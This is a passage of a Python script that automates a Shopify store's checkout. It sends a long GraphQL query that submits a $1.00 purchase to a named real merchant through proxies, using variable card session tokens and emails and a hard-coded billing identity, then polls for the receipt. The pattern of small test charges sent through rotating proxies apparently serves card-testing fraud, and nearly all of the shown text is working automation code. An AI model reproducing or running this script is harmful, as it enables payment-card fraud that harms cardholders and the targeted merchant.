currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'sessionInput': {
                        'sessionToken': x,
                    },
                    'queueToken': queue_token,
                    'delivery': {
                        'deliveryLines': [
                            {
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {
                                    'lines': [{'stableId': stableid}],
                                },
                                'deliveryMethodTypes': ['NONE'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'supportsSplitShipping': True,
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stableid,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/39555780771934',
                                        'variantId': 'gid://shopify/ProductVariant/39555780771934',
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {
                                    'value': {'amount': '1.00', 'currencyCode': 'USD'}
                                },
                            },
                        ],
                    },
                    'payment': {
                        'paymentLines': [
                            {
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentmethodidentifier,
                                        'sessionId': sid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '127 Allen st',
                                                'city': 'New York',
                                                'countryCode': 'US',
                                                'postalCode': '10080',
                                                'company': 'T3',
                                                'firstName': 'Nick',
                                                'lastName': 'Chan',
                                                'zoneCode': 'NY',
                                                'phone': '9718081573',
                                            },
                                        },
                                    },
                                },
                                'amount': {
                                    'value': {'amount': '1', 'currencyCode': 'USD'}
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': '127 Allen st',
                                'city': 'New York',
                                'countryCode': 'US',
                                'postalCode': '10080',
                                'company': 'T3',
                                'firstName': 'Nick',
                                'lastName': 'Chan',
                                'zoneCode': 'NY',
                                'phone': '9718081573',
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': 'USD',
                            'countryCode': 'US',
                        },
                        'email': remail,
                        'marketingConsent': [{'email': {'value': remail}}],
                        'shopPayOptInPhone': {
                            'number': '9718081573',
                            'countryCode': 'US',
                        },
                    },
                    'taxes': {
                        'proposedTotalAmount': {
                            'value': {'amount': '0', 'currencyCode': 'USD'}
                        },
                    },
                },
                'attemptToken': f'{tok}',
            },
        }

        try:
            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql',
                            params=params,
                            headers=headers,
                            json=json_data,
                            proxy=proxy) as response:
                raw = await response.text()
                if response.status == 200:
                    logger.info("Submit for completion successful: Status 200 OK")
                    try:
                        res_json = json.loads(raw)
                        rid = res_json['data']['submitForCompletion']['receipt']['id']
                    except json.JSONDecodeError as e:
                        logger.error(f"JSON decode error in submit for completion: {str(e)}")
                        return f"Submit for completion failed: Invalid JSON response", proxy_used
                else:
                    logger.error(f"Submit for completion failed: Status {response.status}")
                    return f"Submit for completion failed: Status {response.status}", proxy_used
        except Exception as e:
            logger.error(f"Submit for completion exception: {str(e)}. Proxy: {proxy}")
            proxy_used = False
            return f"Submit for completion failed: {str(e)}", proxy_used

        headers = {
            'authority': 'www.buildingnewfoundations.com',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.buildingnewfoundations.com',
            'user-agent': user_agent,
            'x-checkout-one-session-token': x,
        }
        params = {
            'operationName': 'PollForReceipt',
        }
        json_data = {
            'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on 